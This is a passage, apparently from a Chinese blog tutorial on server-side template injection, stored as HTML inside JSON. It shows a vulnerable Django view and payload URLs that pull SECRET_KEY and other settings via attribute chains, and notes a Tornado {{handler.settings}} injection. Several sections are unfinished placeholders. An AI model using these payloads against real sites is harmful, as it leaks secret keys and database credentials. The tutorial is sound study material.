class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, request</span><br><span class=\"line\"><span class=\"keyword\">from</span> jinja2 <span class=\"keyword\">import</span> Template</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&quot;/&quot;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():</span><br><span class=\"line\">    name = request.args.get(<span class=\"string\">&#x27;name&#x27;</span>, <span class=\"string\">&#x27;guest&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    t = Template(<span class=\"string\">&quot;Hello &#123;&#123;n&#125;&#125;&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> t.render(n=name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    app.run()</span><br></pre></td></tr></table></figure>\n<p>这两个例子需要渲染的参数并未交给用户控制，因此不存在 SSTI</p>\n<h3 id=\"tornado\"><a class=\"anchor\" href=\"#tornado\">#</a> Tornado</h3>\n<p>注入 {{handler.settings}} 来获取环境变量</p>\n<p>具体参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY2ltdWh1YXNodWltdS9wLzExNTQ0NDU1Lmh0bWw=\"> python SSTI tornado render 模板注入</span></p>\n<h3 id=\"django\"><a class=\"anchor\" href=\"#django\">#</a> Django</h3>\n<p>漏洞代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def view(request, *args, **kwargs):</span><br><span class=\"line\">    template = &#x27;Hello &#123;user&#125;, This is your email: &#x27; + request.GET.get(&#x27;email&#x27;)</span><br><span class=\"line\">    return HttpResponse(template.format(user=request.user))</span><br></pre></td></tr></table></figure>\n<p>payload (原理：Django 的 &quot;admin&quot; 应用的 model.py 文件有当前网站的配置)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://localhost:8000/?email=&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br><span class=\"line\">http://localhost:8000/?email=&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br></pre></td></tr></table></figure>\n<p>原理：Django 的 &quot;admin&quot; 应用的 model.py 文件有当前网站的配置，通过找到 Django 默认应用 admin 的 model，再通过这个 model 获取 settings 对象，进而获取数据库账号密码、Web 加密密钥等信息</p>\n<h2 id=\"java\"><a class=\"anchor\" href=\"#java\">#</a> JAVA</h2>\n<p>java 常见的引擎：FreeMarker， velocity</p>\n<h3 id=\"velocity\"><a class=\"anchor\" href=\"#velocity\">#</a> velocity</h3>\n<p>待做</p>\n<h3 id=\"freemarker\"><a class=\"anchor\" href=\"#freemarker\">#</a> FreeMarker</h3>\n<p>待做</p>\n<h1 id=\"ctf中的ssti\"><a class=\"anchor\" href=\"#ctf中的ssti\">#</a> CTF 中的 SSTI</h1>\n<p>待做</p>\n<p>参考文章</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYm1qb2tlci9wLzEzNTA4NTM4Lmh0bWw=\">SSTI（模板注入）漏洞（入门篇）</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjI2OTAwI2gzLTIw\">初探 Python Flask+Jinja2 SSTI</span></p>\n",
            "tags": []
        }
    ]
}